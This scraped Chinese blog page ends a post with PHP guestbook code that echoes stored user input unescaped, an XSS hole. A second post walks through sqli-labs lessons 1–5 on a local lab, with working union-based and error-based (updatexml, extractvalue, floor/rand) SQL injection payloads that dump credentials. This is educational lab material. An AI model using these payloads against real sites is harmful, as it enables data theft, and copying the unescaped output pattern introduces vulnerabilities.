class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3 <span class="title">col</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">lable</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;<span class="title">Name</span>&lt;/<span class="title">lable</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">autocomplete</span>=&quot;<span class="title">on</span>&quot; <span class="title">required</span>=&quot;<span class="title">required</span>&quot; <span class="title">placeholder</span>=&quot;你的名字&quot; /&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3 <span class="title">col</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">lable</span> <span class="title">class</span>=&quot;<span class="title">from</span>-<span class="title">lable</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;<span class="title">Message</span>&lt;/<span class="title">lable</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">textarea</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">msg</span>&quot; <span class="title">placeholder</span>=&quot;说点什么吧&quot; <span class="title">required</span>=&quot;<span class="title">required</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 200<span class="title">px</span>&quot;&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">Submit</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;最新留言&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span> <span class="title">py</span>-3 <span class="title">border</span> <span class="title">mb</span>-5 <span class="title">border</span>-<span class="title">warning</span> <span class="title">border</span>-3 <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                $<span class="title">comments</span> = $<span class="title">db</span>-&gt;<span class="title">query</span>(&quot;<span class="title">select</span> `<span class="title">name</span>`, `<span class="title">msg</span>`, `<span class="title">date</span>` <span class="title">from</span> <span class="title">comments</span> <span class="title">order</span> <span class="title">by</span> `<span class="title">id</span>` <span class="title">desc</span> <span class="title">limit</span> 0, 5&quot;);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">if</span> ($<span class="title">comments</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>-<span class="title">striped</span>&quot; <span class="title">style</span>=&quot;<span class="title">word</span>-<span class="title">break</span>:<span class="title">break</span>-<span class="title">all</span>; <span class="title">word</span>-<span class="title">wrap</span>:<span class="title">break</span>-<span class="title">all</span>;&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">font</span>-<span class="title">monospace</span> <span class="title">fw</span>-<span class="title">light</span> <span class="title">fst</span>-<span class="title">italic</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">date</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fs</span>-1 <span class="title">fw</span>-<span class="title">normal</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">name</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">info</span> <span class="title">rounded</span> <span class="title">fs</span>-5 <span class="title">col</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">msg</span>&#x27;] ?&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">                ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">end</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                        <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                        <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=1&quot;&gt;<span class="title">more</span></span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="/images/14.png"></p>
<p><img src="/images/15.png"></p>
<p>bootstrap中提供了一些功能，让网页变为响应式的，也就是随着页面的大小自动调整一些样式</p>
<h1 id="more-php"><a href="#more-php" class="headerlink" title="more.php"></a>more.php</h1><p>实现分页功能，就注意一下边界</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;more&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;../bootstrap-5.1.3-dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;../bootstrap-5.1.3-dist/js/bootstrap.bundle.min.js&quot;</span> defer=<span class="string">&quot;defer&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6 <span class="title">border</span> <span class="title">border</span>-<span class="title">warning</span> <span class="title">border</span>-3 <span class="title">my</span>-5 <span class="title">py</span>-2 <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;]) &amp;&amp; <span class="title">is_numeric</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;]) &amp;&amp; $<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;] &gt; 0)</span></span><br><span class="line"><span class="class">                    $<span class="title">page</span> = (<span class="title">int</span>)$<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;];</span></span><br><span class="line"><span class="class">                <span class="title">else</span></span>&#123;</span><br><span class="line">                    <span class="variable">$page</span> = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;超过范围，显示首页&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$page</span>--;</span><br><span class="line">                <span class="variable">$page</span> *= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select count(*) from comments&quot;</span>)-&gt;fetch();</span><br><span class="line">                <span class="variable">$count</span> = (<span class="keyword">int</span>)<span class="variable">$count</span>[<span class="string">&#x27;count(*)&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$page</span> &gt;= <span class="variable">$count</span>)&#123;</span><br><span class="line">                    <span class="variable">$page</span> = (<span class="keyword">int</span>)((<span class="variable">$count</span> - <span class="number">1</span>) / <span class="number">10</span>) * <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;超过范围，显示尾页&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$comments</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select `name`, `msg`, `date` from comments order by `id` desc limit <span class="subst">$page</span>, 10&quot;</span>);</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$comments</span>) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>-<span class="title">striped</span>&quot; <span class="title">style</span>=&quot;<span class="title">word</span>-<span class="title">break</span>:<span class="title">break</span>-<span class="title">all</span>; <span class="title">word</span>-<span class="title">wrap</span>:<span class="title">break</span>-<span class="title">all</span>;&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">font</span>-<span class="title">monospace</span> <span class="title">fw</span>-<span class="title">light</span> <span class="title">fst</span>-<span class="title">italic</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">date</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fs</span>-1 <span class="title">fw</span>-<span class="title">normal</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">name</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">info</span> <span class="title">rounded</span> <span class="title">fs</span>-5 <span class="title">col</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">msg</span>&#x27;] ?&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">            ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                    <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                    <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">intdiv</span>($<span class="title">page</span>, 10)?&gt;&quot;&gt;上一页</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-4&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                    <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                    <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">intdiv</span>($<span class="title">page</span>, 10) + 2?&gt;&quot;&gt;下一页</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="/images/16.png"></p>
<p><img src="/images/17.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">sqli-labs记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-24 23:07:32" itemprop="dateCreated datePublished" datetime="2022-01-24T23:07:32+08:00">2022-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-09 05:11:59" itemprop="dateModified" datetime="2022-02-09T05:11:59+08:00">2022-02-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>记录一下sqli-labs相关的练习</p>
<p>具体如何判断注入点和回显点看 less-54</p>
<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>靶场搭建在本地虚拟机上，url为 <a target="_blank" rel="noopener" href="http://game.local.com/sqli-labs-master/">http://game.local.com/sqli-labs-master/</a> （仅本地可访问）</p>
<p>字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://game.local.com/sqli-labs-master/Less-<span class="number">1</span>/?id=&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<p>因为此网页只显示查询到的第一条记录，所以如果想要回显所有查询到的数据，需要使用 mysql的 <code>group_concat</code> 函数 或者 最后加上 <code>limit 5,1</code> （5换成别的数字，从0开始计数，5表示查看第6条记录）一条一条查看</p>
<p>正常查询查了三列，所以联合查询也得查三列。三列是通过 order by 是否报错判断出来的。其中2和3 有回显。</p>
<p>数据库名（security），之后为了更加简洁明了，只给出 url 中的 查询字符串</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>表名 （mysql中才能这么查）</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<p>选择表 users ，查列名</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security&#x27; <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<p>知道有 id，username，password 这3列，一次查出所有数据</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat_ws(<span class="string">&#x27;--&#x27;</span>,id, username, <span class="keyword">password</span>) separator <span class="string">&#x27;..&#x27;</span>),<span class="number">3</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>

<p>concat_ws 表示 with separator ，可以指定分隔符，第一个参数就是分隔符</p>
<p>group_concat 也可以指定分隔符，但是是在最后加上 separator ‘指定的分隔符’</p>
<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>数字型</p>
<p>使用谷歌浏览器插件 hackbar，看得比较舒服</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>和sql语句构造相关的php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>‘’$id’ 用括号包裹，闭合单引号后还要闭合圆括号</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>在 less-3 的基础上，把单引号换成了双引号</p>
<p>php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>url</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>



<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>此页面若是查询到数据，则会多显示出一行 <code>You are in...........</code> （不需要sql语句查询到的记录有且仅有一条，可以查询到多条记录），而且会显示sql语句的报错信息。由此想到可以使用布尔盲注或者报错注入。</p>
<p>盲注比较麻烦，所以先使用报错注入，盲注后面应该有机会用到</p>
<p>使用的数据库为 mysql 版本为 5.7.26</p>
<p>给出三个可以用于mysql报错注入的sql语句，payload为user()，使用时换成自己想要的</p>
<p>报错原因大体为 rand(0) 伪随机序列导致临时表中主键重复，想要深入了解可以网上查一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>

<p>以下两个函数 extractvalue 和 updatexml 与 xml 相关，报错原因是xpath语法错误</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>报错注入时，sql语句不能有语法错误。给出一种简单的使用方法，0x7e 表示 ‘~’ （报错信息中，两个波浪线中间的就是 database() ）</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> database()),<span class="number">0</span>x7e),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<p>hackbar 中有 updatexml 报错注入的模板</p>
<p>看了一眼标题，double injection ，我还以为是 二次注入 还是 二次编码</p>
